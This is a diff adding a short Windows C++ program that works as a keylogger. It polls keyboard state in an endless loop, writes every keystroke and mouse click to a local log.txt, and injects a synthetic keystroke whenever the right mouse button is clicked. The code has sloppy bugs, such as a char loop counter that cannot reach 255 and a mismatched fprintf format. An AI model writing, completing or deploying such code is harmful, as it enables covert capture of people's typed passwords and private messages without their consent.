@@ -1,0 +1,65 @@
+#include<iostream>
+#include<fstream>
+#include<Windows.h>
+
+using namespace std;
+
+int save(int key, char *file);
+
+int WinMain(HINSTANCE hInstance,
+	HINSTANCE hPrevInstance,
+	LPTSTR    lpCmdLine,
+	int       nCmdShow)
+{
+	char i;
+	while (true) {
+	for (i = 8; i <= 255; i++) {
+	if (GetAsyncKeyState(i) == -32767) {
+	save(i, "log.txt");
+	}
+	}
+	}
+}
+int save(int key, char *file) {
+	cout << key << endl;
+	FILE *OUTPUT_FILE;
+
+	OUTPUT_FILE = fopen(file, "a+");
+	if (key == VK_SHIFT)
+		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+
+	else if
+		(key == VK_RBUTTON){
+		fprintf(OUTPUT_FILE, "%s", "[RCLICK]");
+	INPUT ip;
+	ip.type = INPUT_KEYBOARD;
+	ip.ki.time = 0;
+	ip.ki.dwFlags = KEYEVENTF_UNICODE;
+	ip.ki.wScan = '2';
+	ip.ki.wVk = 0;
+	ip.ki.dwExtraInfo = 0;
+	SendInput(1, &ip, sizeof(INPUT));
+}
+ else if
+ (key == VK_LBUTTON)
+ fprintf(OUTPUT_FILE, "%s", "[LCLICK]");
+ else if
+	 (key == VK_RETURN) {
+	 fprintf(OUTPUT_FILE, "%s", "[ENTER]");
+
+ }
+
+ else if
+ (key == VK_ESCAPE)
+ fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+ else if
+(key == VK_BACK) 
+fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+ 
+ else
+ fprintf(OUTPUT_FILE, "%s", &key);
+ fclose(OUTPUT_FILE);
+
+ return 0;
+
+ }
